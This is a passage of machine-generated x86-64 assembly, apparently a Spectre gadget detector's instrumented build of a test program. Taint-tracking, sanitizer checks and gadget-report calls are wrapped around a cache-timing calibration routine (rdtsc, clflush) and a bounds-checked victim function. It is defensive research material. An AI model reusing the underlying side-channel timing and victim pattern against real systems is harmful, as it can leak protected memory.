            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___377:

            nop
            movb (%rbx),%al
            xorl %edx,%edx
            movb %dl,(dift_reg_tags+4)
.L__dift_done__teapot___378:

            nop
            movl $1000,%esi
            xorl %r8d,%r8d
            movb %r8b,(dift_reg_tags+5)
.L__dift_done__teapot___379:

            nop
            movq (instruction_cnt),%rdx
            addq $4,%rdx
            cmpq $250,%rdx
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rdx,(instruction_cnt)
            movl $0,%edi
.L_15ce__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $77,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            mfence 
            lfence 
            xorl %r8d,%r8d
            movb %r8b,(dift_reg_tags)
            movb %r8b,(dift_reg_tags+3)
.L__dift_done__teapot___383:

            nop
            rdtsc 
            shlq $32,%rdx
            xorl %r9d,%r9d
            orb (dift_reg_tags),%r9b
            orb (dift_reg_tags+3),%r9b
            movb %r9b,(dift_reg_tags)
.L__dift_done__teapot___384:

            nop
            orq %rdx,%rax
            lfence 
            xorl %r8d,%r8d
            orb (dift_reg_tags),%r8b
            movb %r8b,(dift_reg_tags+8)
.L__dift_done__teapot___385:

            nop
            movq %rax,%r8
            leaq (%rbx),%rbp
            xorq %rdx,%rdx
            orb (dift_reg_tags+1),%dl
            testb $48,%dl
            je .L__attacker_tags_check__teapot___386

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rbp,%rsi
            movq %rdx,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___386:

            testb $2,%dl
            je .L__asan_check__teapot___386

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rbp,%rsi
            movq %rdx,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__asan_check__teapot___386:

            movq %rbp,%r9
            shrq $3,%r9
            movb 2147450880(%r9),%r9b
            testb %r9b,%r9b
            je .L__mem_operand_policy_done__teapot___386

            movb %bpl,%al
            andb $7,%al
            cmpb %r9b,%al
            jl .L__mem_operand_policy_done__teapot___386
.L__asan_check_fail__teapot___386:

            testb $1,%dl
            je .L__asan_check_fail_non_attacker__teapot___386
.L__asan_check_fail_attacker__teapot___386:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rbp,%rsi
            movq %rdx,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___386
.L__asan_check_fail_non_attacker__teapot___386:

            orb $2,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___386:

            nop
            leaq (%rbx),%rdx
            btcq $45,%rdx
            xorl %r9d,%r9d
            orb (dift_reg_tags+1),%r9b
            orb (%rdx),%r9b
            movb %r9b,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___387

            movb (dift_reg_queued_tag),%r9b
            movzbq (dift_reg_queued_id),%rbp
            orb %r9b,(dift_reg_tags)(%rbp)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___387:

            nop
            movb (%rbx),%al
            xorl %ebp,%ebp
            movb %bpl,(dift_reg_tags)
            movb %bpl,(dift_reg_tags+3)
            movb %bpl,(dift_reg_tags+2)
.L__dift_done__teapot___388:

            nop
            rdtscp 
            shlq $32,%rdx
            xorl %r9d,%r9d
            orb (dift_reg_tags),%r9b
            orb (dift_reg_tags+3),%r9b
            movb %r9b,(dift_reg_tags)
.L__dift_done__teapot___389:

            nop
            orq %rdx,%rax
            lfence 
            xorl %ecx,%ecx
            orb (dift_reg_tags+8),%cl
            orb (dift_reg_tags),%cl
            movb %cl,(dift_reg_tags)
.L__dift_done__teapot___390:

            nop
            subq %r8,%rax
            xorl %r8d,%r8d
            orb (dift_reg_tags),%r8b
            orb (dift_reg_tags+5),%r8b
            movb %r8b,(dift_reg_tags+5)
.L__dift_done__teapot___391:

            nop
            addq %rax,%rdi
            xorl %edx,%edx
            orb (dift_reg_tags+4),%dl
            testb $48,%dl
            je .L__check_ok__teapot___392

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rdx,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___392:

            nop
            subl $1,%esi
            leaq (.__trampoline__d49eeba5_904a_4187_b78a_e46d8c7310ac__teapot__)(%rip),%rdx
            movq %rdx,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___393)(%rip),%rdx
            movq %rdx,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__d49eeba5_904a_4187_b78a_e46d8c7310ac__teapot__)(%rip),%rdx
            movq %rdx,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___393:

            nop
            jne .L_15ce__teapot__
.L__trampoline_target__3355bc12_2f56_40e8_86e7_a47839b48bb9__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $70,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            shrq $3,%rdi
            xorl %edx,%edx
            movb %dl,(dift_reg_tags+3)
.L__dift_done__teapot___395:

            nop
            movabsq $2361183241434822607,%rdx
            xorl %r8d,%r8d
            orb (dift_reg_tags+5),%r8b
            movb %r8b,(dift_reg_tags)
.L__dift_done__teapot___396:

            nop
            movq %rdi,%rax
            mulq %rdx
            shrq $4,%rdx
            xorl %r8d,%r8d
            orb (dift_reg_tags+3),%r8b
            movb %r8b,(dift_reg_tags+9)
.L__dift_done__teapot___397:

            nop
            movq %rdx,%r9
            xorl %edx,%edx
            movb %dl,(dift_reg_tags+4)
.L__dift_done__teapot___398:

            nop
            movl $1000,%esi
            xorl %r8d,%r8d
            movb %r8b,(dift_reg_tags+5)
.L__dift_done__teapot___399:

            nop
            movq (instruction_cnt),%rdx
            addq $8,%rdx
            cmpq $250,%rdx
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rdx,(instruction_cnt)
            movl $0,%edi
.L_1622__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $78,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            clflush (%rbx)
            jmp restore_checkpoint_EXT_LIB@PLT

            mfence 
            lfence 
            xorl %r8d,%r8d
            movb %r8b,(dift_reg_tags)
            movb %r8b,(dift_reg_tags+3)
.L__dift_done__teapot___403:

            nop
            rdtsc 
            shlq $32,%rdx
            xorl %ebp,%ebp
            orb (dift_reg_tags),%bpl
            orb (dift_reg_tags+3),%bpl
            movb %bpl,(dift_reg_tags)
.L__dift_done__teapot___404:

            nop
            orq %rdx,%rax
            lfence 
            xorl %ecx,%ecx
            orb (dift_reg_tags),%cl
            movb %cl,(dift_reg_tags+8)
.L__dift_done__teapot___405:

            nop
            movq %rax,%r8
            leaq (%rbx),%rcx
            xorq %rbp,%rbp
            orb (dift_reg_tags+1),%bpl
            testb $48,%bpl
            je .L__attacker_tags_check__teapot___406

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rcx,%rsi
            movq %rbp,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___406:

            testb $2,%bpl
            je .L__asan_check__teapot___406

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rcx,%rsi
            movq %rbp,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__asan_check__teapot___406:

            movq %rcx,%rax
            shrq $3,%rax
            movb 2147450880(%rax),%al
            testb %al,%al
            je .L__mem_operand_policy_done__teapot___406

            movb %cl,%dl
            andb $7,%dl
            cmpb %al,%dl
            jl .L__mem_operand_policy_done__teapot___406
.L__asan_check_fail__teapot___406:

            testb $1,%bpl
            je .L__asan_check_fail_non_attacker__teapot___406
.L__asan_check_fail_attacker__teapot___406:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rcx,%rsi
            movq %rbp,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___406
.L__asan_check_fail_non_attacker__teapot___406:

            orb $2,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___406:

            nop
            leaq (%rbx),%rbp
            btcq $45,%rbp
            xorl %eax,%eax
            orb (dift_reg_tags+1),%al
            orb (%rbp),%al
            movb %al,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___407

            movb (dift_reg_queued_tag),%al
            movzbq (dift_reg_queued_id),%rcx
            orb %al,(dift_reg_tags)(%rcx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___407:

            nop
            movb (%rbx),%al
            xorl %ecx,%ecx
            movb %cl,(dift_reg_tags)
            movb %cl,(dift_reg_tags+3)
            movb %cl,(dift_reg_tags+2)
.L__dift_done__teapot___408:

            nop
            rdtscp 
            shlq $32,%rdx
            xorl %ecx,%ecx
            orb (dift_reg_tags),%cl
            orb (dift_reg_tags+3),%cl
            movb %cl,(dift_reg_tags)
.L__dift_done__teapot___409:

            nop
            orq %rdx,%rax
            lfence 
            xorl %ecx,%ecx
            orb (dift_reg_tags+8),%cl
            orb (dift_reg_tags),%cl
            movb %cl,(dift_reg_tags)
.L__dift_done__teapot___410:

            nop
            subq %r8,%rax
            xorl %ecx,%ecx
            orb (dift_reg_tags),%cl
            orb (dift_reg_tags+5),%cl
            movb %cl,(dift_reg_tags+5)
.L__dift_done__teapot___411:

            nop
            addq %rax,%rdi
            xorl %edx,%edx
            orb (dift_reg_tags+4),%dl
            testb $48,%dl
            je .L__check_ok__teapot___412

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rdx,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___412:

            nop
            subl $1,%esi
            leaq (.__trampoline__70a0842c_7442_4079_80d5_8a6e361514d1__teapot__)(%rip),%rdx
            movq %rdx,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___413)(%rip),%rdx
            movq %rdx,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__70a0842c_7442_4079_80d5_8a6e361514d1__teapot__)(%rip),%rdx
            movq %rdx,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___413:

            nop
            jne .L_1622__teapot__
.L__trampoline_target__feba9be2_389a_47d5_a1fb_b0570cc80cc9__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $72,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            shrq $3,%rdi
            xorl %edx,%edx
            movb %dl,(dift_reg_tags+2)
.L__dift_done__teapot___415:

            nop
            movabsq $2361183241434822607,%rcx
            xorl %edx,%edx
            orb (dift_reg_tags+5),%dl
            movb %dl,(dift_reg_tags)
.L__dift_done__teapot___416:

            nop
            movq %rdi,%rax
            xorl %edx,%edx
            orb (dift_reg_tags),%dl
            orb (dift_reg_tags+2),%dl
            movb %dl,(dift_reg_tags)
            movb %dl,(dift_reg_tags+3)
.L__dift_done__teapot___417:

            nop
            mulq %rcx
            xorl %r8d,%r8d
            orb (dift_reg_tags+3),%r8b
            movb %r8b,(dift_reg_tags+2)
.L__dift_done__teapot___418:

            nop
            movq %rdx,%rcx
            shrq $4,%rcx
            xorl %edx,%edx
            orb (dift_reg_tags+9),%dl
            orb (dift_reg_tags+2),%dl
            movb %dl,(dift_reg_tags+3)
.L__dift_done__teapot___419:

            nop
            leaq (%r9,%rcx,2),%rdx
            xorl %r8d,%r8d
            movb %r8b,(dift_reg_tags+7)
.L__dift_done__teapot___420:

            nop
            movabsq $-6148914691236517205,%rbp
            xorl %eax,%eax
            orb (dift_reg_tags+3),%al
            movb %al,(dift_reg_tags)
.L__dift_done__teapot___421:

            nop
            movq %rdx,%rax
            xorl %edx,%edx
            orb (dift_reg_tags+7),%dl
            orb (dift_reg_tags),%dl
            movb %dl,(dift_reg_tags)
            movb %dl,(dift_reg_tags+3)
.L__dift_done__teapot___422:

            nop
            mulq %rbp
            shrq $1,%rdx
            xorl %r8d,%r8d
            orb (dift_reg_tags+3),%r8b
            movb %r8b,(dift_reg_tags+7)
.L__dift_done__teapot___423:

            nop
            movq %rdx,%rbp
            xorl %eax,%eax
            orb (dift_reg_tags+3),%al
            movb %al,(dift_reg_tags+8)
.L__dift_done__teapot___424:

            nop
            movq %rdx,%r8
            xorl %eax,%eax
            orb (dift_reg_tags+9),%al
            movb %al,(dift_reg_tags+3)
.L__dift_done__teapot___425:

            nop
            movq %r9,%rdx
            xorl %edi,%edi
            movb %dil,(dift_reg_tags+4)
.L__dift_done__teapot___426:

            nop
            leaq (.L_20f0)(%rip),%rsi
            xorl %edi,%edi
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___427:

            nop
            movl $1,%edi
            movq %rbx,(scratchpad+524288)
            xorl %eax,%eax
            movb %al,(dift_reg_tags)
.L__dift_done__teapot___428:

            nop
            movq (scratchpad+524288),%rbx
            movl $0,%eax
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq -8(%rsp),%rcx
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            jmp restore_checkpoint_EXT_LIB@PLT

            callq __printf_chk__dift_wrapper__@PLT
.L__ret_transform_target_calibrate_latency__f2c78883_cafe_4189_9142_3e2e7a7f80f8__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $79,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %edi,%edi
            orb (dift_reg_tags+1),%dil
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___432:

            nop
            movq %rbx,%rdi
            movq %rcx,(scratchpad+524288)
            leaq -8(%rsp),%rax
            movq (memory_history_top),%rcx
            movq (%rax),%rbx
            movq %rax,(%rcx)
            movq %rbx,8(%rcx)
            leaq 16(%rcx),%rcx
            movq %rcx,(memory_history_top)
            movq (scratchpad+524288),%rcx
            jmp restore_checkpoint_EXT_LIB@PLT

            callq free@PLT
.L__ret_transform_target_calibrate_latency__48ba0df4_5a09_4457_9486_7852d5684508__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $75,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %ebx,%ebx
            orb (dift_reg_tags+7),%bl
            movb %bl,(dift_reg_tags)
.L__dift_done__teapot___436:

            nop
            movq %rbp,%rax
            addq $8,%rsp
            movq %rax,(scratchpad+524288)
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %ebx,%ebx
            orb (%rax),%bl
            movb %bl,(dift_reg_tags+1)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___437

            movb (dift_reg_queued_tag),%bl
            movzbq (dift_reg_queued_id),%rbp
            orb %bl,(dift_reg_tags)(%rbp)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___437:

            nop
            movq (scratchpad+524288),%rax
            popq %rbx
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %ebp,%ebp
            orb (%rax),%bpl
            movb %bpl,(dift_reg_tags+7)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___438

            movb (dift_reg_queued_tag),%bpl
            movzbq (dift_reg_queued_id),%rbx
            orb %bpl,(dift_reg_tags)(%rbx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___438:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            popq %rbp
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $5,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___441

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___441:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.L_16b7__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $71,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+2)
.L__dift_done__teapot___443:

            nop
            leaq (__PRETTY_FUNCTION__.33725)(%rip),%rcx
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___444:

            nop
            movl $134,%edx
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___445:

            nop
            leaq (.L_2052)(%rip),%rsi
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+5)
.L__dift_done__teapot___446:

            nop
            leaq (.L_205c)(%rip),%rdi
            leaq -8(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r11
            movq %rsi,(%r12)
            movq %r11,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq __assert_fail@PLT
.size calibrate_latency__teapot__, . - calibrate_latency__teapot__
victim_function__teapot__:

            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movq %rsp,%rcx
            shrq $3,%rcx
            leaq 2147450880(%rcx),%rcx
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movb $255,(%rcx)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $88,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movq %rdx,(scratchpad+524304)
            xorl %eax,%eax
            orb (dift_reg_tags+15),%al
            leaq -8(%rsp),%rcx
            btcq $45,%rcx
            movabsq $72340172838076673,%rdx
            imulq %rdx,%rax
            movq (memory_history_top),%rbx
            movq (%rcx),%rdx
            movq %rcx,(%rbx)
            movq %rdx,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq %rax,(%rcx)
            addq $8,%rcx
.L__dift_done__teapot___451:

            nop
            movq (scratchpad+524304),%rdx
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq -8(%rsp),%rcx
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            pushq %r15
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            xorl %r15d,%r15d
            orb (dift_reg_tags+14),%r15b
            leaq -8(%rsp),%rcx
            btcq $45,%rcx
            movabsq $72340172838076673,%rax
            imulq %rax,%r15
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq %r15,(%rcx)
            addq $8,%rcx
.L__dift_done__teapot___453:

            nop
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            movq %rbx,(scratchpad+524288)
            leaq -8(%rsp),%rax
            movq (memory_history_top),%rbx
            movq (%rax),%r15
            movq %rax,(%rbx)
            movq %r15,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq (scratchpad+524288),%rbx
            pushq %r14
            movq %rbx,(scratchpad+524288)
            xorl %r14d,%r14d
            orb (dift_reg_tags+13),%r14b
            leaq -8(%rsp),%rax
            btcq $45,%rax
            movabsq $72340172838076673,%r15
            imulq %r15,%r14
            movq (memory_history_top),%rbx
            movq (%rax),%r15
            movq %rax,(%rbx)
            movq %r15,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq %r14,(%rax)
            addq $8,%rax
.L__dift_done__teapot___455:

            nop
            movq (scratchpad+524288),%rbx
            leaq -8(%rsp),%r15
            movq (memory_history_top),%rax
            movq (%r15),%r14
            movq %r15,(%rax)
            movq %r14,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            pushq %r13
            xorl %r14d,%r14d
            orb (dift_reg_tags+12),%r14b
            leaq -8(%rsp),%rax
            btcq $45,%rax
            movabsq $72340172838076673,%r15
            imulq %r15,%r14
            movq (memory_history_top),%r13
            movq (%rax),%r15
            movq %rax,(%r13)
            movq %r15,8(%r13)
            leaq 16(%r13),%r13
            movq %r13,(memory_history_top)
            movq %r14,(%rax)
            addq $8,%rax
.L__dift_done__teapot___457:

            nop
            leaq -8(%rsp),%rax
            movq (memory_history_top),%r13
            movq (%rax),%r15
            movq %rax,(%r13)
            movq %r15,8(%r13)
            leaq 16(%r13),%r13
            movq %r13,(memory_history_top)
            pushq %r12
            xorl %r13d,%r13d
            orb (dift_reg_tags+7),%r13b
            leaq -8(%rsp),%r15
            btcq $45,%r15
            movabsq $72340172838076673,%r14
            imulq %r14,%r13
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %r13,(%r15)
            addq $8,%r15
.L__dift_done__teapot___459:

            nop
            leaq -8(%rsp),%r15
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            pushq %rbp
            xorl %r13d,%r13d
            orb (dift_reg_tags+1),%r13b
            leaq -8(%rsp),%r15
            btcq $45,%r15
            movabsq $72340172838076673,%r14
            imulq %r14,%r13
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %r13,(%r15)
            addq $8,%r15
.L__dift_done__teapot___461:

            nop
            leaq -8(%rsp),%r15
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            pushq %rbx
            subq $8,%rsp
            xorl %r15d,%r15d
            orb (dift_reg_tags+5),%r15b
            movb %r15b,(dift_reg_tags+13)
.L__dift_done__teapot___463:

            nop
            movq %rdi,%r13
            xorl %r15d,%r15d
            orb (dift_reg_tags+4),%r15b
            movb %r15b,(dift_reg_tags+7)
.L__dift_done__teapot___464:

            nop
            movq %rsi,%rbp
            xorl %r15d,%r15d
            orb (dift_reg_tags+3),%r15b
            movb %r15b,(dift_reg_tags+12)
.L__dift_done__teapot___465:

            nop
            movl %edx,%r12d
            xorl %r15d,%r15d
            orb (dift_reg_tags+2),%r15b
            movb %r15b,(dift_reg_tags+14)
.L__dift_done__teapot___466:

            nop
            movl %ecx,%r14d
            xorl %eax,%eax
            orb (dift_reg_tags+8),%al
            movb %al,(dift_reg_tags+1)
.L__dift_done__teapot___467:

            nop
            movl %r8d,%ebx
            movq %rbx,(scratchpad+524288)
            leaq (array_size)(%rip),%rbx
            btcq $45,%rbx
            xorl %r15d,%r15d
            orb (%rbx),%r15b
            movb %r15b,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___468

            movb (dift_reg_queued_tag),%r15b
            movzbq (dift_reg_queued_id),%rax
            orb %r15b,(dift_reg_tags)(%rax)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___468:

            nop
            movq (scratchpad+524288),%rbx
            movl (array_size)(%rip),%eax
            shrl $1,%eax
            xorl %r15d,%r15d
            orb (dift_reg_tags),%r15b
            orb (dift_reg_tags+8),%r15b
            testb $48,%r15b
            je .L__check_ok__teapot___469

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %r15,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___469:

            nop
            movq (instruction_cnt),%r15
            addq $17,%r15
            cmpq $250,%r15
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r15,(instruction_cnt)
            cmpl %r8d,%eax
            leaq (.__trampoline__56a60200_76a9_4348_afec_f9d08a4fb692__teapot__)(%rip),%r15
            movq %r15,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___471)(%rip),%r15
            movq %r15,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__56a60200_76a9_4348_afec_f9d08a4fb692__teapot__)(%rip),%r15
            movq %r15,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___471:

            nop
            ja .L_170f__teapot__
.L__trampoline_target__0c647829_3f6e_424c_8bc4_eec8c4caa290__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $90,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rbx,(scratchpad+524288)
            leaq (array_size)(%rip),%rbx
            btcq $45,%rbx
            xorl %r15d,%r15d
            orb (%rbx),%r15b
            movb %r15b,(dift_reg_tags)
